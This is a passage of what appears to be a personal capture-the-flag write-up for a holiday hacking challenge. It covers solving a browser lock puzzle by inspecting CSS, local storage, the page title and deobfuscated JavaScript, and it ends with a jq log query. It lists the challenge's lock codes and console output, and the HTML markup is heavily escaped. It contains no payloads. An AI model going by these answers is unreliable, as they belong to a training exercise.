&lt;span class="n"&gt;which&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;was&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;with&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;combination&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;rd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lock&lt;/span&gt;

&lt;span class="mf"&gt;4.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ILMJRNTP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;found&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;storage&lt;/span&gt;
&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CJ4WCMG4&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="mf"&gt;6.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;from&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;card&lt;/span&gt;&lt;span class="o"&gt;..&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Y3WJVE01&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sticker&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;but&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;one&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;removes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hologram&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CSS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;letters&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;are&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;different&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;order&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;JYV0EW13&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;
&lt;span class="mf"&gt;7.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;G7LDS1LS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;font&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;family&lt;/span&gt;

&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;VERONICA&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;In&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;that&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;eggs&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;go&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bad&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;must&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;figure&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;who&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;will&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;be&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sad&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
&lt;span class="n"&gt;From&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;js&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;then&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;deobfuscated&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;make&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;readable&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;just&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;through&lt;/span&gt;

&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="n"&gt;SEOGRW1&lt;/span&gt;
&lt;span class="n"&gt;chakra&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;css&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;

&lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;sleighworkshopdoor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;elfu&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;css&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;styles&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;css&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;73&lt;/span&gt;&lt;span class="n"&gt;cda8f4&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;dc7&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;edc&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;adb8&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;b2bd4b3ecd12&lt;/span&gt;
&lt;span class="mf"&gt;10.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;compopnent&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;swab&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bunch&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;of&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;things&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;around&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lock&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;c10&lt;/span&gt;

&lt;span class="n"&gt;finding&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;locks&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;li&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c10&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cover&lt;/span&gt;

&lt;span class="n"&gt;one&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;can&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;remove&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cover&lt;/span&gt;

&lt;span class="n"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;board&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;there&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;s a code: KD29XJ37&lt;/span&gt;

&lt;span class="n"&gt;but&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;other&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;codes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;have&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;been&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;per&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;..&lt;/span&gt;

&lt;span class="n"&gt;console&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;says&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Missing macaroni&amp;quot;&lt;/span&gt;

&lt;span class="n"&gt;In&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;there&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;s:&lt;/span&gt;

&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;console&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;log&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Well done! Here&amp;#39;s the password:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;console&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;_0x1e21&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0x45&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)](&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%c&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;reward&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;_0x1e21&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0x46&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

&lt;span class="n"&gt;In&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;console&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;there&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;s this whenever one presses the unlock:&lt;/span&gt;

&lt;span class="mi"&gt;73&lt;/span&gt;&lt;span class="n"&gt;cda8f4&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;dc7&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;edc&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;adb8&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;b2bd4b3ecd12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Error&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Missing&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;macaroni&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HTMLButtonElement&lt;/span&gt;&lt;span class="o"&gt;.&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;anonymous&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;73&lt;/span&gt;&lt;span class="n"&gt;cda8f4&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;dc7&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;edc&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;adb8&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;b2bd4b3ecd12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;anonymous&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;73&lt;/span&gt;&lt;span class="n"&gt;cda8f4&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;dc7&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;edc&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;adb8&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;b2bd4b3ecd12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;

&lt;span class="n"&gt;there&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;s a bunch of &amp;quot;&amp;lt;div class=&amp;quot;component gnome, mac, swab&amp;quot; with data-codes: XJ0 A33 J39&lt;/span&gt;

&lt;span class="n"&gt;Dragging&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;components&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;further&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;down&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;changed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;printed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;console&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

&lt;span class="n"&gt;Well&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;done&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Here&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;s the password:&lt;/span&gt;
&lt;span class="mi"&gt;73&lt;/span&gt;&lt;span class="n"&gt;cda8f4&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;dc7&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;edc&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;adb8&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;b2bd4b3ecd12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;The&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Tooth&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Fairy&lt;/span&gt;
&lt;span class="mi"&gt;73&lt;/span&gt;&lt;span class="n"&gt;cda8f4&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;dc7&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;edc&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;adb8&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;b2bd4b3ecd12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;You&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;opened&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;chest&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;6291.088&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;seconds&lt;/span&gt;
&lt;span class="mi"&gt;73&lt;/span&gt;&lt;span class="n"&gt;cda8f4&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;dc7&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;edc&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;adb8&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;b2bd4b3ecd12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Well&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;done&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;have&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;takes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Crack&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Crate&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;under&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;three&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;minutes&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;
&lt;span class="mi"&gt;73&lt;/span&gt;&lt;span class="n"&gt;cda8f4&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;dc7&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;edc&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;adb8&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;b2bd4b3ecd12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Feel&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;free&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;use&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;handy&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;your&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;score&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
&lt;li&gt;Doing the combination locks in under 3 minutes I think can be done manually.&lt;ul&gt;
&lt;li&gt;But nice thing to do would be to enter a bunch of commands into the browser console to help with some programmatically. Maybe one can enter javascript to also enter the numbers into the locks??&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;console.log(document.title)
some are maybe fixed??:
VERONICA
KD29XJ37

However, after doing that as fast as I could manually:

You opened the chest in 150.151 seconds
621c8819-1d6a-4d77-bd41-5214a6beccf5:1 Very impressive!! But can you Crack the Crate in less than five seconds?
621c8819-1d6a-4d77-bd41-5214a6beccf5:1 Feel free to use this handy image to share your score!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
&lt;li&gt;For that I'm thinking burp suite to automate the browser is needed?&lt;/li&gt;
&lt;li&gt;When inside the Sled Shop there was a request to get the IP for the connection with longest duration:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;head&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;conn&lt;/span&gt;.&lt;span class="nv"&gt;log&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nv"&gt;jq&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.[&amp;quot;id.orig_h&amp;quot;],.duration&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;c&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sort_by(.duration)&amp;#39;&lt;/span&gt;
